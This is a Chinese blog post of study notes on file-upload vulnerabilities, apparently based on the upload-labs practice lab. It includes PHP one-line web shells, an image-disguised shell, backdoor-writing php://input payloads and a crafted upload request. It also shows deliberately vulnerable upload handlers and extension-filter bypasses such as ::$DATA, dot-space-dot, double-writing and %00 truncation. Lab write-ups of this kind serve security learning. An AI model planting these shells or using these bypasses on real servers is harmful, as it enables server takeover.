<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="emmmm 感觉没啥好说的"><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>文件上传 | zhiliya</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="zhiliya" type="application/atom+xml">
</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">zhiliya</a></h1></div><p class="m-desc">心之所向，无惧无悔,<br>愿求仁得仁，复无怨怼！</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">文件上传</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">2019-11-23</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/web/">web</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'zhiliya'</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"zhiliya"</span>]);<span class="meta">?&gt;</span></span><br><span class="line">上传成功后 在返回的html页面中找到上传后的路径 然后访问该路径下的木马 看看能不能被当做php文件解析 然后蚁剑连之</span><br><span class="line">蚁剑连接返回<span class="number">404</span>则表明该文件不存在或文件路径不存在  返回数据为空则表明能文件路径和文件存在但并未被解析</span><br><span class="line">gif png都能解析 唯独jpg不行</span><br><span class="line">若上传</span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">"pHp"</span>&gt;phpinfo();&lt;/script&gt;</span><br><span class="line">&lt;script language=<span class="string">"pHp"</span>&gt;@<span class="keyword">eval</span>($_POST[<span class="string">'zhiliya'</span>])&lt;/script&gt;</span><br><span class="line">能显示phpinfo页面</span><br><span class="line">但连不上蚁剑</span><br></pre></td></tr></table></figure>

<p>![image-20200729212058088](5 文件上传/image-20200729212058088.png)</p>
<p>![image-20200729212228189](5 文件上传/image-20200729212228189.png)</p>
<p>![image-20200729213223227](5 文件上传/image-20200729213223227.png)</p>
<p>换菜刀</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写后门</span><br><span class="line">?file=php:<span class="comment">//input     <span class="meta">&lt;?</span>fputs(fopen("shell.php","w"),"<span class="meta">&lt;?php</span> eval($_post['xxx'];<span class="meta">?&gt;</span>")<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'1.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST["bu1"]);?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>![11525934-e19630249b9b8764](5 文件上传/11525934-e19630249b9b8764.png)</p>
<h1 id="客户端检测绕过-javascript-检测"><a href="#客户端检测绕过-javascript-检测" class="headerlink" title="客户端检测绕过(javascript 检测)"></a>客户端检测绕过(javascript 检测)</h1><ul>
<li><p>直接在前端页面改</p>
</li>
<li><p>改成jpg后缀绕过前端js代码检测限制 然后用burp改jpg后缀为php  </p>
<p>改回php还是为了能够解析上传的文件 不然一个jpg文件上传也不能以php文件解析 没用啊</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">----------------------------<span class="number">-145951556421633</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"upload_file"</span>; filename=<span class="string">"1.png"</span>    先将php文件后缀改为允许的格式            改为php解析</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"zhiliya"</span>]);<span class="meta">?&gt;</span></span><br><span class="line">----------------------------<span class="number">-145951556421633</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"submit"</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">----------------------------<span class="number">-145951556421633</span>--</span><br></pre></td></tr></table></figure>

<h1 id="服务端检测绕过-MIME-类型检测"><a href="#服务端检测绕过-MIME-类型检测" class="headerlink" title="服务端检测绕过(MIME 类型检测)"></a>服务端检测绕过(MIME 类型检测)</h1><p><strong>conten-type文 件 类</strong>：Content-Type: image/jpeg      image/gif         image/png</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&lt;用 burp 之类的反向代理工具伪造 POST 数据包到服务端，绕过 MIME 检测&gt;</p>
<h1 id="服务端检测绕过-文件扩展名检测"><a href="#服务端检测绕过-文件扩展名检测" class="headerlink" title="服务端检测绕过(文件扩展名检测)"></a>服务端检测绕过(文件扩展名检测)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        </span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);<span class="comment">//黑名单  第一个</span></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);  <span class="comment">//首尾去空格</span></span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点  文件名末尾加点  windows特性</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写  </span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA  windows特性</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空  windows特性</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="黑名单检测"><a href="#黑名单检测" class="headerlink" title="黑名单检测"></a>黑名单检测</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">黑名单禁用了asp aspx php jsp   </span><br><span class="line"></span><br><span class="line">用这些后缀绕过：.phtml .php3 .php4 .php5     .pht .phps    .phtm    .php1 .php2    .html .htm     (容易失败)</span><br><span class="line">前提：appache配置里要加入AddType application/x-httpd-php .phtml .php3 .php4 .php5 .pht .phps .phtm .php1 .php2 .html .htm</span><br><span class="line">   表示这些后缀名的文件都会被当成php解析</span><br><span class="line"></span><br><span class="line">大小写：.pHp|   .pHp5|.pHp4|.pHp3|.pHp2|pHp1| .Html|.Htm|    .pHtml</span><br></pre></td></tr></table></figure>

<h3 id="大小写绕过-使用文件包含利用"><a href="#大小写绕过-使用文件包含利用" class="headerlink" title="大小写绕过 使用文件包含利用"></a>大小写绕过 使用文件包含利用</h3><p><code>$file_ext = strtolower($file_ext); //转换为小写</code></p>
<p><a href="http://127.0.0.1/upload-labs-master/include.php?file=upload/202007291402101138.Php" target="_blank" rel="noopener">http://127.0.0.1/upload-labs-master/include.php?file=upload/202007291402101138.Php</a> 使用文件包含利用</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191215220752679.png" alt="image-20191215220752679"></p>
<h3 id="后缀名中加空格绕过-windows特性-可以"><a href="#后缀名中加空格绕过-windows特性-可以" class="headerlink" title="后缀名中加空格绕过  windows特性  可以"></a>后缀名中加空格绕过  windows特性  可以</h3><p><code>$file_ext = trim($file_ext); //首尾去空</code></p>
<p>利用windows特性，会自动去掉后缀名中最后的” ”，可在后缀名中加” ”绕过：</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191215221236285.png" alt="image-20191215221236285"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094455676.png" alt="image-20191216094455676"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094610261.png" alt="image-20191216094610261"></p>
<h3 id="加”-”绕过-windows特性"><a href="#加”-”绕过-windows特性" class="headerlink" title="加”.”绕过 windows特性"></a>加”.”绕过 windows特性</h3><p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p>
<p>利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过：</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191215222245597.png" alt="image-20191215222245597"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094636357.png" alt="image-20191216094636357"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094702159.png" alt="image-20191216094702159"></p>
<h3 id="加”-DATA”绕过-Windows流特性绕过"><a href="#加”-DATA”绕过-Windows流特性绕过" class="headerlink" title="加” ::$DATA”绕过 Windows流特性绕过"></a>加” ::$DATA”绕过 Windows流特性绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php在windows的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名。</span><br></pre></td></tr></table></figure>

<p>没有对后缀名进行去”::$DATA”处理，利用windows特性，可在后缀名中加” ::$DATA”绕过</p>
<p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191215222845262.png" alt="image-20191215222845262"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094747875.png" alt="image-20191216094747875"></p>
<p>![image-20200729142114788](5 文件上传/image-20200729142114788.png)</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094838943.png" alt="image-20191216094838943"></p>
<h3 id="点空格点绕过-windows特性"><a href="#点空格点绕过-windows特性" class="headerlink" title="点空格点绕过 windows特性"></a>点空格点绕过 windows特性</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>,<span class="string">".ini"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>又是涨姿势的一关，程序先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用类似one.php. .(两个点号之间有一个空格)绕过，如果重名名了文件的话应该会用$file_ext来进行拼凑文件，这样保存在服务器中的文件将没有后缀（去除了.空格）</p>
<p>如果从第三关到第九关，如果目标服务器是windows系统的话，均可用点空格点绕过。</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216092336256.png" alt="image-20191216092336256"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094104714.png" alt="image-20191216094104714"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094151764.png" alt="image-20191216094151764"></p>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);    <span class="comment">//替换黑名单内文件后缀为空  str_ireplace会重复替换 1.phpphp传上去就变成1</span></span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>![image-20200729143826059](5 文件上传/image-20200729143826059.png)</p>
<p>![image-20200729143838954](5 文件上传/image-20200729143838954.png)</p>
<p>不成功</p>
<p>![](5 文件上传/image-20200729144114564.png)</p>
<p>![image-20200729144046619](5 文件上传/image-20200729144046619.png)</p>
<p>成功</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216091811854.png" alt="image-20191216091811854"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216095058144.png" alt="image-20191216095058144"></p>
<h2 id="白名单检测"><a href="#白名单检测" class="headerlink" title="白名单检测"></a>白名单检测</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>截断条件：</p>
<p>1、php版本小于5.3.4 2、php.ini的magic_quotes_gpc为OFF状态</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">不能<span class="number">00</span>截断的：</span><br><span class="line">$img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br></pre></td></tr></table></figure>

